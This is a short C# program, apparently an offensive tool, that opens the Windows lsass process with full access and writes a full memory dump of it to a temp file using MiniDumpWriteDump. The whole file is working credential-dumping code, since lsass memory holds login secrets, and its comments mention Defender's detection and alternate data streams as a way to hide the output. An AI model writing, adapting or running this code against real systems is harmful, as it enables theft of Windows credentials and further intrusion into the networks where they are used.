using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace Dumpsass
{
    internal class Program
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CreateFile(string lpFileName, FileAccess dwDesiredAccess,
                FileShare dwShareMode, IntPtr lpSecurityAttributes, FileMode dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile,
                int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        static readonly uint PROCESS_ACCESS = 0x001F0FFF;
        static readonly int FULL_MEMORY = 2;

        
        static void Main(string[] args)
        {
            // say my name
            int procId = Process.GetProcessesByName("lsass")[0].Id;

            // handle lsass process
            IntPtr hProcess = OpenProcess(PROCESS_ACCESS, false, procId);

            // dump to file
            string system = Environment.GetEnvironmentVariable("SystemRoot");
            string fpath = $"{system}\\Temp\\dump.dmp";

            // we can use winapi to create a file - we can also write to an alternate data stream with the winapi CreateFile
            IntPtr pathstream = CreateFile(fpath, FileAccess.ReadWrite, FileShare.Write, IntPtr.Zero, FileMode.Create, 0, IntPtr.Zero);

            // dump me baby
            bool dmp = MiniDumpWriteDump(hProcess, (uint)procId, pathstream, FULL_MEMORY, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            if (dmp)
            {
                Console.WriteLine("File written in: {0}", fpath);
            }
            else
            {
                Console.WriteLine("not dumped");
            }

            // obvsly defender identify the output file signature as Trojan:Win32/LsassDump.A
        }
    }
}
